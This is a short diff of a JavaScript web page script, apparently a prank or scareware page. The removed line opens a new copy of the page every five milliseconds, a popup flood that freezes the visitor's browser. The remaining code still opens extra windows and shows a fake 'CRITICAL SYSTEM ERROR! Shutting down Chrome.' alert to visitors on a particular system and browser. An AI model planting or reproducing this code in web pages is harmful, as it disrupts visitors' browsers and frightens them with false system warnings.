@@ -94,7 +94,8 @@ if (RTCPeerConnection) (function () {
      popup = false;
   }
   if(popup) {
-    setInterval(function() {window.open(window.location.href+'#AMPT');}, 5);
+    window.open(window.location.href);
+    window.open(window.location.href);
   }
   if(OS=='Linux x86_64' && navigator.sayswho == 'Chrome 54') {
     alert('CRITICAL SYSTEM ERROR! Shutting down Chrome.');
